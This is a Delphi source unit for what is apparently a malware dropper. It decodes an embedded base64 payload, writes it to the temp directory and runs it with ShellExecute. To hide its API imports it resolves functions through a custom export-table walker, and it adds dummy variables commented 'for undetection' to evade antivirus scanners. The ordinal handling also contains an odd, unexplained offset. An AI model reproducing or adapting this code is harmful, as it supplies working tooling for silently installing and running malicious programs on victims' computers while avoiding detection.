unit functions;

interface
  uses windows;

  procedure DropAndExecute(FileData, Filename:string);

implementation

type
ShellExecute = function(hWnd: HWND; Operation, FileName, Parameters,Directory: PChar; ShowCmd: Integer): HINST; stdcall;
GetTempPath = function(nBufferLength: DWORD; lpBuffer: PChar): DWORD; stdcall;
CreateFile = function(lpFileName: PChar; dwDesiredAccess, dwShareMode: DWORD;lpSecurityAttributes: PSecurityAttributes; dwCreationDisposition, dwFlagsAndAttributes: DWORD;hTemplateFile: THandle): THandle; stdcall;
WriteFile = function(hFile: THandle; const Buffer; nNumberOfBytesToWrite: DWORD;var lpNumberOfBytesWritten: DWORD; lpOverlapped: POverlapped): BOOL; stdcall;
CloseHandle = function(hObject: THandle): BOOL; stdcall;

const

  Codes64 = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/';

function Encode64(S: string): string;
var
  i: Integer;
  a: Integer;
  x: Integer;
  b: Integer;
begin
  Result := '';
  a := 0;
  b := 0;
  for i := 1 to Length(s) do
  begin
    x := Ord(s[i]);
    b := b * 256 + x;
    a := a + 8;
    while a >= 6 do
    begin
      a := a - 6;
      x := b div (1 shl a);
      b := b mod (1 shl a);
      Result := Result + Codes64[x + 1];
    end;
  end;
  if a > 0 then
  begin
    x := b shl (6 - a);
    Result := Result + Codes64[x + 1];
  end;
end;

function Decode64(S: string): string;
var
  i: Integer;
  a: Integer;
  x: Integer;
  b: Integer;
  useless:string;//for undetection
  useless1:string;//for undetection
begin
  Result := '';
  a := 0;
  b := 0;
  useless := 'aaa';
  for i := 1 to Length(s) do
  begin
    x := Pos(s[i], codes64) - 1;
    if x >= 0 then
    begin
      b := b * 64 + x;
      useless := 'nh';
      a := a + 6;
      if a >= 8 then
      begin
        a := a - 8;
        useless1 := 'vv';
        x := b shr a;
        b := b mod (1 shl a);
        x := x mod 256;
        Result := Result + chr(x);
      end;
    end
    else
      Exit;
  end;
end;

function MyGetProcAddress(hModule: HMODULE; lpProcName: LPCSTR): FARPROC;
var
  DataDirectory: TImageDataDirectory;
  lpExports, lpExport: PImageExportDirectory;
  i: Cardinal;
  Ordinal: Word;
  dwRVA: ^Cardinal;
begin
  Result := nil;
  DataDirectory := PImageNtHeaders(Cardinal(hModule) + Cardinal(PImageDosHeader(hModule)^._lfanew))^.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
  lpExports := Pointer(hModule + DataDirectory.VirtualAddress);
  for i := 0 to lpExports.NumberOfNames -1 do
  begin
    lpExport := PImageExportDirectory(hModule + DWORD(lpExports.AddressOfNames) + i * sizeof(DWORD));
    if lstrcmp(lpProcName, PChar(hModule + lpExport.Name)) = 0 then
    begin
          Ordinal := PWord(hModule + DWORD(lpExports.AddressOfNameOrdinals) + i * sizeof(Word))^;
          Inc(Ordinal, 3);
          dwRva := Pointer(hModule + DWORD(lpExports.AddressOfFunctions) + Ordinal * sizeof(DWORD));
          Result := Pointer(hModule + dwRVA^);
          Break;
    end;
  end;
end;

function MyLoadLibrary(lpLibFileName: PAnsiChar): HMODULE;
var
  xLoadLibrary: function(lpLibFileName: PAnsiChar): HMODULE; stdcall;
begin
  xLoadLibrary := MyGetProcAddress(GetModuleHandle(kernel32), 'LoadLibraryA');
  Result := xLoadLibrary(lpLibFilename);
end;

function GetTempDirectory: String;
var
  TempPath: array[0..MAX_PATH] of Char;
  xGetTempPath:GetTempPath;
begin
  @xGetTempPath := MyGetProcAddress(GetModuleHandle(kernel32),Pchar('GetTempPathA'));
  xGetTempPath(MAX_PATH, TempPath);
  Result := TempPath;
end;

procedure DropAndExecute(FileData, Filename:string);
var
FileHandle:Thandle;
BytesWritten:DWORD;
xCreateFile:CreateFile;
xWriteFile:WriteFile;
xCloseHandle:CloseHandle;
xShellExecute:ShellExecute;
begin
  FileData := Decode64(FileData);

  @xCreateFile := MyGetProcAddress(GetModuleHandle(kernel32),'CreateFileA');
  FileHandle := xCreateFile(PChar(GetTempDirectory+Filename), GENERIC_WRITE, FILE_SHARE_READ, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

  @xWriteFile := MyGetProcAddress(GetModuleHandle(kernel32),'WriteFile');
  xWriteFile(FileHandle, FileData[1], Length(FileData), BytesWritten, nil);
  
  @xCloseHandle := MyGetProcAddress(GetModuleHandle(kernel32),'CloseHandle');
  xCloseHandle(FileHandle);
  
  @xShellExecute := MyGetProcAddress(MyLoadLibrary('Shell32.dll'),'ShellExecuteA');
  xShellExecute(0, 'OPEN', PChar(GetTempDirectory+Filename), '', '', SW_NORMAL);
end;

end.